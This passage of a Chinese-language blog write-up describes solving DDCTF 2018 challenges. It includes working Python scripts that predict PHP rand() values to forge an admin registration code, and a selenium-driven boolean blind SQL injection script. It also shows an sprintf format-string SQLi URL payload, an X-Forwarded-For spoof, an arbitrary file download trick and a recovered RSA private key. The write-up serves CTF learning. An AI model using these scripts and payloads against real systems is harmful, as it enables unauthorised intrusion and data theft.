alt=\"avatar\"></p>\n<p>需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。</p>\n<h1 id=\"我的博客\"><a href=\"#我的博客\" class=\"headerlink\" title=\"我的博客\"></a>我的博客</h1><h2 id=\"审计代码-1\"><a href=\"#审计代码-1\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。</p>\n<h3 id=\"index-php\"><a href=\"#index-php\" class=\"headerlink\" title=\"index.php\"></a>index.php</h3><pre><code>if(isset($_GET[&#39;id&#39;])){\n    $id = addslashes($_GET[&#39;id&#39;]);\n    if(isset($_GET[&#39;title&#39;])){\n        $title = addslashes($_GET[&#39;title&#39;]);\n        $title = sprintf(&quot;AND title=&#39;%s&#39;&quot;, $title);\n    }else{\n        $title = &#39;&#39;;\n    }\n    $sql = sprintf(&quot;SELECT * FROM article WHERE id=&#39;%s&#39; $title&quot;, $id);\n\n    foreach ($pdo-&gt;query($sql) as $row) {\n        echo &quot;&lt;h1&gt;&quot;.$row[&#39;title&#39;].&quot;&lt;/h1&gt;&lt;br&gt;&quot;.$row[&#39;content&#39;];\n        die();\n    }\n}\n</code></pre><p>可以看到该地方使用了两次sprintf，可以立马想到<a href=\"https://paper.seebug.org/386/\" target=\"_blank\" rel=\"noopener\">从WordPress SQLi谈PHP格式化字符串问题</a>,问题就是，需要以admin的身份登录。</p>\n<h3 id=\"login-php\"><a href=\"#login-php\" class=\"headerlink\" title=\"login.php\"></a>login.php</h3><pre><code>if($_SERVER[&#39;REQUEST_METHOD&#39;] === &quot;POST&quot;) {\n    if(!(isset($_POST[&#39;csrf&#39;]) and (string)$_POST[&#39;csrf&#39;] === $_SESSION[&#39;csrf&#39;])) {\n        die(&quot;CSRF token error!&quot;);\n    }\n\n    $username = (isset($_POST[&#39;username&#39;]) === true &amp;&amp; $_POST[&#39;username&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;username&#39;] : die(&#39;Missing username&#39;);\n    $password = (isset($_POST[&#39;password&#39;]) === true &amp;&amp; $_POST[&#39;password&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;password&#39;] : die(&#39;Missing password&#39;);\n\n    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) {\n        die(&#39;Invalid input&#39;);\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;SELECT password FROM users WHERE username = :username&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username]);\n\n    if ($sth-&gt;fetch()[0] !== $password) {\n        die(&#39;wrong password&#39;);\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;SELECT `identity` FROM users WHERE username = :username&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username]);\n\n    if ($sth-&gt;fetch()[0] === &quot;admin&quot;) {\n        $_SESSION[&#39;is_admin&#39;] = true;\n    } else {\n        $_SESSION[&#39;is_admin&#39;] = false;\n    }\n\n    #echo $username;\n    header(&quot;Location: index.php&quot;);\n}\n</code></pre><p>login部分使用pdo进行查询，并且字符串之间的比较也是”===”，不可能存在任何漏洞。</p>\n<h3 id=\"register-php\"><a href=\"#register-php\" class=\"headerlink\" title=\"register.php\"></a>register.php</h3><pre><code>if(!(isset($_POST[&#39;csrf&#39;]) and (string)$_POST[&#39;csrf&#39;] === $_SESSION[&#39;csrf&#39;])) {\n        die(&quot;CSRF token error!&quot;);\n    }\n\n    $admin = &quot;admin###&quot; . substr(str_shuffle(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;), 0, 32);\n    $username = (isset($_POST[&#39;username&#39;]) === true &amp;&amp; $_POST[&#39;username&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;username&#39;] : die(&#39;Missing username&#39;);\n    $password = (isset($_POST[&#39;password&#39;]) === true &amp;&amp; $_POST[&#39;password&#39;] !== &#39;&#39;) ? (string)$_POST[&#39;password&#39;] : die(&#39;Missing password&#39;);\n    $code = (isset($_POST[&#39;code&#39;]) === true) ? (string)$_POST[&#39;code&#39;] : &#39;&#39;;\n    if (strlen($username) &gt; 32 || strlen($password) &gt; 32) {\n        die(&#39;Invalid input&#39;);\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;SELECT username FROM users WHERE username = :username&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username]);\n\n    if ($sth-&gt;fetch() !== false) {\n        die(&#39;username has been registered&#39;);\n    }\n\n    if($code === $admin) {\n        $identity = &quot;admin&quot;;\n    } else {\n        $identity = &quot;guest&quot;;\n    }\n\n    $sth = $pdo-&gt;prepare(&#39;INSERT INTO users (username, password, `identity`) VALUES (:username, :password, :identity)&#39;);\n    $sth-&gt;execute([&#39;:username&#39; =&gt; $username, &#39;:password&#39; =&gt; $password, &#39;:identity&#39; =&gt; $identity]);\n\n    echo &#39;&lt;script&gt;alert(&quot;register success&quot;);location.href=&quot;./login.php&quot;&lt;/script&gt;&#39;;\n} else {\n</code></pre><p>register部分，使用str_shuffle生成admin密码，同时给出rand()来作为csrf值。</p>\n<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; id=&quot;csrf&quot; value=&quot;&lt;?php $_SESSION[&#39;csrf&#39;] = (string)rand();echo $_SESSION[&#39;csrf&#39;]; ?&gt;&quot; required&gt;\n&lt;label for=&quot;inputUsername&quot; class=&quot;sr-only&quot;&gt;Username&lt;/label&gt;\n</code></pre><p>可以想到乌云的一篇文章，也是翻译自国外，原文可以自己找<a href=\"https://wooyun.js.org/drops/Web%E5%BA%94%E7%94%A8%E9%9A%90%E5%BD%A2%E5%90%8E%E9%97%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.html\" target=\"_blank\" rel=\"noopener\">Web应用隐形后门的设计与实现</a>。这样的话，就可以明确思路，首先通过预测rand()值，来预测密码，在使用该密码注册一个账号，进入博客，然后通过sprintf格式化漏洞获取flag。</p>\n<h2 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h2><p>现在关键就是预测rand()值，通过google，可以找到0ctf2016,有相似的题目，<a href=\"http://www.vuln.cn/6004\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6004</a>,文中提到，只要有大于等于32个连续的rand()随机数，就可以大概预测接下来rand()的值。</p>\n<pre><code>#!php\nstate[i] = state[i-3] + state[i-31]\nreturn state[i] % 2147483648\n</code></pre><p>同时，需要知道一定要使用 requests.session来keep-alive，否则的话，获得的rand()值并不是连续的，也就不满足上面的公式了。</p>\n<p>此外，在获得超过32个rand()值之后，并预测到接下来的62个rand()之后，还需要重新实现str_shuffle函数。通过阅读php源码，可以找到str_shuffle函数的实现。</p>\n<pre><code>static void php_string_shuffle(char *str, long len TSRMLS_DC) /* {{{ */\n{\n    long n_elems, rnd_idx, n_left;\n    char temp;\n    /* The implementation is stolen from array_data_shuffle       */\n    /* Thus the characteristics of the randomization are the same */\n    n_elems = len;\n\n    if (n_elems &lt;= 1) {\n        return;\n    }\n\n    n_left = n_elems;\n\n    while (--n_left) {\n        rnd_idx = php_rand(TSRMLS_C);\n        RAND_RANGE(rnd_idx, 0, n_left, PHP_RAND_MAX);\n        if (rnd_idx != n_left) {\n            temp = str[n_left];\n            str[n_left] = str[rnd_idx];\n            str[rnd_idx] = temp;\n        }\n    }\n}\n</code></pre><p>其中RAND_RANGE函数的实现如下:</p>\n<pre><code>#define RAND_RANGE(__n, __min, __max, __tmax) \\\n(__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))\n</code></pre><p>准备工作就绪，就可以编写代码了。<br>代码如下:</p>\n<pre><code>import requests\nfrom lxml import etree\n\nurl = &quot;http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/register.php&quot;\n\ndata = {\n    &#39;username&#39;: &#39;dida&#39;,\n    &#39;password&#39;: &#39;dida&#39;,\n    &#39;csrf&#39;: &#39;2086003527&#39;,\n    &#39;code&#39;: &#39;&#39;\n}\n\ndef get_csrf(html):\n    html = etree.HTML(html)\n    token = html.xpath(&#39;//*[@id=&quot;csrf&quot;]&#39;)[0].get(&#39;value&#39;)\n    return token\n\n\ndef rand_range(rand, n_left):\n     return int((n_left + 1.0) * (rand / (2147483648.0)))\n\n\ndef shuffle(calc_rand):\n    str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;\n    str_temp = list(str)\n    str_len = len(str_temp)\n    n_left = str_len - 1\n    temp = &quot;&quot;\n    while n_left:\n        randdata = calc_rand[61 - n_left]\n        index = rand_range(randdata, n_left)\n        if index != n_left:\n            temp = str_temp[n_left]\n            str_temp[n_left] = str_temp[index]\n            str_temp[index] = temp\n        n_left = n_left - 1\n\n    return &quot;&quot;.join(str_temp)\n\nwhile 1:\n    s = requests.session()\n    l = []\n    for i in range(33):\n        res = s.get(url)\n        token = get_csrf(res.content)\n        l.append(token)\n\n    calc_rand = []\n    temp_calc_rand = []\n    for i in range(33, 95):\n        value = (int(l[i - 31]) + int(l[i-3])) % 2147483648\n        l.append(value)\n        temp_calc_rand.append(value)\n\n    str = &quot;admin###&quot; + shuffle(temp_calc_rand)[0:32]\n    data[&#39;code&#39;] = str\n    data[&#39;csrf&#39;] = l[32]\n\n    res = s.post(url = url, data = data)\n    print(res.content)\n    break\n</code></pre><p>运行上边的代码，就可以注册一个账号，至于该账号是不是admin,多试几次总会成功。</p>\n<p>登陆之后，就可以使用sprintf字符串格式化漏洞来进行sql注入。这个就不在赘述了。<br>基本的payload如下:</p>\n<blockquote>\n<p><a href=\"http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$\" target=\"_blank\" rel=\"noopener\">http://116.85.39.110:5032/2ae51a1981cbbdef618d3c46af6199cb/index.php?id=%1$&amp;title=%1$</a>‘ or 2=1 union select 1,2,3%23</p>\n</blockquote>\n<p>最后得到flag: <code>DDCTF{9b7ccc1e96387b5ce079adab2fb08022}</code></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"签到题目\"><a href=\"#签到题目\" class=\"headerlink\" title=\"签到题目:\"></a>签到题目:</h1><p>复制，粘贴</p>\n<h1 id=\"╯°□°）╯︵-┻━┻\"><a href=\"#╯°□°）╯︵-┻━┻\" class=\"headerlink\" title=\"(╯°□°）╯︵ ┻━┻\"></a>(╯°□°）╯︵ ┻━┻</h1><p>题目给了一个字符串</p>\n<pre><code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1b2e2e5e2b5b4e4b8b7e6e1e1b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd\n</code></pre><p>首先，应该想到两两一组，一组代表一个字符，考虑到DDCTF，”DD”两个字符，在字符串中找到两组相邻的字符串，找到了”c4c4”和”e1e1”：</p>\n<p>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b2e2e5e2b5b4e4b8b  7e6<b>e1e1</b>b6b9e4b5e3b8b1b1e3e5b5b6b4b1b0e4e6b2fd</p>\n<p>进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示”DD”, 然后以此类推：</p>\n<p><img src=\"/images/ddctf/20180420150038.png\" alt=\"avatar\"></p>\n<h1 id=\"第四扩展FS\"><a href=\"#第四扩展FS\" class=\"headerlink\" title=\"第四扩展FS\"></a>第四扩展FS</h1><ol>\n<li>下载下来是一张图片</li>\n</ol>\n<p>首先:<code>binwalk windows.jpg</code></p>\n<pre><code>security:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg\n\nDECIMAL         HEX             DESCRIPTION\n-------------------------------------------------------------------------------------------------------\n30              0x1E            TIFF image data, big-endian\n2871992         0x2BD2B8        LZMA compressed data, properties: 0x01, dictionary size: 2097152 bytes, uncompressed size: 134217728 bytes\n7236510         0x6E6B9E        Zip archive data, at least v2.0 to extract, compressed size: 20430, uncompressed size: 33350, name: &quot;file.txt&quot;\n7257054         0x6EBBDE        End of Zip archive\n\nProgress: 81.81% (10890274 / 13310878)\n</code></pre><p>可以看到图片里边有个压缩包。<br>这时候，可以使用<code>dd</code>或者<code>foremost</code>命令，来分离压缩包。</p>\n<blockquote>\n<p>dd if=windows.jpg of=temp.zip skip=7236510 count=20544 bs=1<br>foremost windows.jpg</p>\n</blockquote>\n<p>得到一个压缩包，然后，查看图片属性，会在详细信息-&gt;备注里看到一个字符串”Pactera”，估计就是密码。</p>\n<ol>\n<li>然后打开file.txt</li>\n</ol>\n<p><img src=\"/images/ddctf/20180420151247.png\" alt=\"avatar\"><br>可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。</p>\n<pre><code>grep -o . file.txt | sort |uniq -c | sort -rn\n</code></pre><p><img src=\"/images/ddctf/20180420151941.png\" alt=\"avatar\"></p>\n<p>然后从新组合一下，就得到flag了。</p>\n<pre><code>DDCTF{ZuozHengqU3dEshi}\n</code></pre>","more":"<h1 id=\"流量分析\"><a href=\"#流量分析\" class=\"headerlink\" title=\"流量分析\"></a>流量分析</h1><p>这道题，花了我很长时间，直到ddctf快结束，才做出来，可以说完全被Fl-g.zip和sqlmap.zip绕进去了，气的我都想打我自己。<br>过程如下:<br>首先大体上浏览整个数据包，会发现，大体上就是3个部分:  </p>\n<ul>\n<li>ftp 发送了两个zip,Fl-g.zip和sqlmap.zip,传了一大堆数据  </li>\n<li>邮件相关的数据包</li>\n<li>https相关的包，由于只有几个，竟然被我选择性忽略了。</li>\n</ul>\n<h2 id=\"ftp之Fl-g-zxip\"><a href=\"#ftp之Fl-g-zxip\" class=\"headerlink\" title=\"ftp之Fl-g.zxip\"></a>ftp之Fl-g.zxip</h2><blockquote>\n<p>tcp.stream eq 2004   </p>\n</blockquote>\n<p>右键follow tcp流，保存数据，发现只有119kb，解压也提示包损坏，要密码，最终也没啥结果。</p>\n<p>然后，感觉应该是follow tcp流，没有得到所有的数据，于是，使用:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到Fl-g.zip相关的数据包,另存为flag.pcap，然后编写代码，一个一个的拼接数据。</p>\n<pre><code>from scapy.all import * \npcaps = rdpcap(&quot;flag.pcap&quot;)\n\nfp = open(&quot;flag.zip&quot;, &quot;wb&quot;)\nlength = 0\nfor pcap in pcaps:\n    value = pcap[&#39;Raw&#39;].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n</code></pre><p>得到13M大小的flag.zip,通过一番操作，尝试了密码爆破，伪加密，压缩包修复，来来回回折腾了几遍，最终，使用7-zip，密码:zhangsan，竟然解压得到了一个类似于mp4格式的文件，不知道这玩意和qr-code.jpg有什么关系，还没办法播放。主要原因，还是Fl-g.zip缺失了大量的数据，在明知缺失大量数据的情况下，感觉应该立即放弃，不过这压缩包名字实在太忽悠，折腾了3,4天我才放弃，浪费我大量时间。</p>\n<h2 id=\"ftp之sqlmap-zip\"><a href=\"#ftp之sqlmap-zip\" class=\"headerlink\" title=\"ftp之sqlmap.zip\"></a>ftp之sqlmap.zip</h2><blockquote>\n<p>tcp.stream eq 2005</p>\n</blockquote>\n<p>既然给了这个压缩包，感觉应该会有点用（实际上:一点用没有）,首先，follow tcp流，只有163kb，于是和Fl-g.zip一样,过滤:</p>\n<blockquote>\n<p>tcp.stream eq 2004 &amp;&amp; ftp-data</p>\n</blockquote>\n<p>得到sqlmap.zip相关的数据包,另存为sqlmap.pcap，然后编写代码，一个一个的拼接数据。</p>\n<pre><code>from scapy.all import * \npcaps = rdpcap(&quot;sqlmap.pcap&quot;)\n\nfp = open(&quot;sqlmap.zip&quot;, &quot;wb&quot;)\nlength = 0\nfor pcap in pcaps:\n    value = pcap[&#39;Raw&#39;].original\n    length += len(value)\n    fp.write(value)\nprint(length)\nfp.close()\n</code></pre><p>得到了一个sqlmap.zip，第一次打开，用winrar，点击工具-&gt;修复压缩文件，修复一下。然后，爆破，伪加密，又搞了一遍，我都不知道我哪来的耐心。最后，想到已知明文攻击。</p>\n<p>已知明文攻击: 已知明文攻击要求加密的压缩包和非加密的压缩包里有相同的文件，并且文件的crc32值要相同，然后就可以使用archpr这个软件进行已知明文攻击。</p>\n<p>然后，去github.com下载最新版本的sqlmap,发现文件的crc32值并不相同，需要下载sqlmap1.1.10.zip才行。最后，解压sqlmap.zip得到的文件和sql1.1.10.zip里的文件一模一样，没有一点有用的东西。</p>\n<h2 id=\"邮件部分\"><a href=\"#邮件部分\" class=\"headerlink\" title=\"邮件部分\"></a>邮件部分</h2><p>通过follow tcp流，当tcp.stream eq 2016的时候，会看到有一个image001图片:</p>\n<pre><code>Content-type: image/png; name=&quot;image001.png&quot;;\n x-mac-creator=&quot;4F50494D&quot;;\n x-mac-type=&quot;504E4766&quot;\nContent-ID: &lt;image001.png@01D38B05.8079CE40&gt;\nContent-disposition: inline;\n    filename=&quot;image001.png&quot;\nContent-transfer-encoding: base64\n</code></pre><p>下边跟着一大堆base64字符串，直接复制保存到一个文件1.txt里边。</p>\n<pre><code>import base64\n\nfp = open(&quot;1.txt&quot;, &quot;r&quot;)\nfp1 = open(&quot;file.png&quot;, &quot;wb&quot;)\n\nfp1.write(base64.b64decode(fp.read()))\n</code></pre><p>然后，就可以得到一个file.png。</p>\n<p><img src=\"/images/ddctf/20180425151942.png\" alt=\"avatar\"></p>\n<p>然后，就是将图片中的字符串提取出来。</p>\n<pre><code>MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n</code></pre><p>再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。</p>\n<p>一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。</p>\n<h2 id=\"得到flag\"><a href=\"#得到flag\" class=\"headerlink\" title=\"得到flag\"></a>得到flag</h2><p>今天是ddctf最后一天，”喝杯java”，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。</p>\n<p>rsa密钥也就是，保存一下就行了:</p>\n<pre><code>-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ\nLsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO\nvMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB\nAoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4\nQGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/\nQbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN\nczILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ\nZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9\nkzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN\n+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1\nAnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH\n/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH\n2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=\n-----END RSA PRIVATE KEY-----\n</code></pre><p><img src=\"/images/ddctf/20180420184445.png\" alt=\"avatar\"></p>\n<p>然后，查看http包，flag就出来了。</p>\n<p><img src=\"/images/ddctf/20180420183706.png\" alt=\"avatar\"></p>\n<h1 id=\"数据库的秘密\"><a href=\"#数据库的秘密\" class=\"headerlink\" title=\"数据库的秘密\"></a>数据库的秘密</h1><h2 id=\"X-forwarded-for\"><a href=\"#X-forwarded-for\" class=\"headerlink\" title=\"X-forwarded-for\"></a>X-forwarded-for</h2><p>首先打开网页，可以看到”非法链接，只允许来自 123.232.23.245 的访问”,很容易就想到修改X-forwarded-for, Chrome下我使用<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件,然后修改一下X-forwarded-for就行了</p>\n<h2 id=\"寻找注入点\"><a href=\"#寻找注入点\" class=\"headerlink\" title=\"寻找注入点\"></a>寻找注入点</h2><p>既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。</p>\n<ul>\n<li>id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。</li>\n<li>title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。</li>\n<li>author<ul>\n<li>“admin”, 会得到author 为 “admin” 的两条记录</li>\n<li>“admin’”, 一条记录都没有</li>\n<li>“admin’#”, 同样会得到author 为 “admin” 的两条记录，那注入点应该就是这里了。</li>\n<li>“admin’ and 1=1#”, 发现会有网站防火墙拦截，应该是”and”被拦截，可以使用”&amp;&amp;”来替换”and”,然后，同样会查询出两条记录。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>找到注入点之后，就好办了。</p>\n<ul>\n<li>“admin’ order by 6#”, 失败，”admin’ order by 5#”，成功查询，那就是5列了。 </li>\n<li>“admin’ union select 1,2,3,4,5#”, 被防火墙拦截，然后就是各种测试”union select”,没能成功绕过(比赛结束之后，有师傅说可以绕过，<a href=\"https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">链接</a>，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。</li>\n<li>“admin’ &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)&lt;’z’)#”,成功拿到数据，接下来就是写脚本拿flag了。<br>脚本如下:</li>\n</ul>\n<pre><code>import time\nfrom selenium import webdriver\nimport string\n\nstrings = string.ascii_letters + string.punctuation + string.digits\nstring_value = &quot;,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz{}&quot;\nurl=&quot;http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php&quot;\npath=&quot;D:\\\\python\\\\chromedriver.exe&quot;\ndriver = webdriver.Chrome(executable_path=path)\npayload = &quot;admin&#39; &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)=&#39;%s&#39;)#&quot;\npayload_table = &quot;admin&#39; &amp;&amp; 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;ddctf&#39;),%d,1)=&#39;%s&#39;)#&quot;\npayload_column = &quot;admin&#39; &amp;&amp; 1=(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctf_key7&#39;),%d,1)=&#39;%s&#39;)#&quot;\npayload_value = &quot;admin&#39; &amp;&amp; 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord(&#39;%s&#39;))#&quot;\n\ndef inject():\n    data = &quot;&quot;\n\n    driver.get(url)\n    input(&quot;jixu:&quot;)\n    judge = True\n    index = 1\n    while judge:\n        judge_temp = False\n        for i in string_value:\n            payload_temp = payload_value % (index, i)\n            print(payload_temp)\n            driver.get(url)\n            driver.execute_script(&#39;document.getElementById(&quot;author&quot;).type=&quot;text&quot;&#39;)\n            driver.find_element_by_id(&quot;author&quot;).send_keys(payload_temp)\n            driver.find_element_by_id(&quot;button&quot;).click()\n            if &quot;admin&quot; in driver.page_source:\n                data += i\n                index += 1\n                judge_temp = True\n                print(data)\n                break\n            time.sleep(1)\n        if judge_temp is not True:\n            driver.close()\n            judge = False\n\ninject(payload_value)\n# table_schema:  ddctf\n# tables: ctf_key7, message\n# columns: ctf_key7下: secvalue，flag就保存在sevalue里边\n</code></pre><h2 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h2><ul>\n<li><p>每次请求时，js都会计算一个sig值和time值，计算方法在main.js中<br><code><br>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseint(c a)))+((c=\"c%a)\">35?String.fromCharCode(c+29):c.toString(36))};if(!’’.replace(/^/,String)){while(c–)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return’\\w+’};c=1;};while(c–)if(k[c])p=p.replace(new RegExp(‘\\b’+e(c)+’\\b’,’g’),k[c]);return p;}(‘e f(0,4){5 7=\\’\\’;l(i m 0){n(i!=\\’c\\’){a=\\’\\’;a=i+\\’=\\’+0[i];7+=a}}o k(7+4)};5 0={8:\\’\\’,9:\\’\\’,b:\\’\\’,6:\\’\\’,d:h(j v().u()/w)};e x(){0[\\’8\\’]=1.2(\\’8\\’).3;0[\\’9\\’]=1.2(\\’9\\’).3;0[\\’b\\’]=1.2(\\’b\\’).3;0[\\’6\\’]=1.2(\\’6\\’).3;5 c=f(0,4);1.2(\\’g\\’).q=”p.s?r=”+c+”&amp;d=”+0.d;1.2(\\’g\\’).t()}’,34,34,’obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt’.split(‘|’),0,{}))<br></a?\"\":e(parseint(c></code><br>看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。</p>\n</li>\n<li><p>由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:</p>\n</li>\n</ul>\n<pre><code>driver.get(url)\ninput(&quot;jixu:&quot;)\n</code></pre><p>首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。</p>\n<h1 id=\"专属链接\"><a href=\"#专属链接\" class=\"headerlink\" title=\"专属链接\"></a>专属链接</h1><h2 id=\"任意文件下载\"><a href=\"#任意文件下载\" class=\"headerlink\" title=\"任意文件下载\"></a>任意文件下载</h2><p>首先F12抓包，会看到一个有意思的请求，<a href=\"http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you\" target=\"_blank\" rel=\"noopener\">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you</a> can only download .class .xml .ico .ks files”,表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。</p>\n<p><img src=\"/images/ddctf/20180421191033.png\" alt=\"avatar\"></p>\n<p>其中需要注意的有三个文件，</p>\n<ul>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造”116.85.48.102:5050/flag/test/flag/DDCTF{BASD}”或类似的链接使得网站报错即可得到。</p>\n<p><img 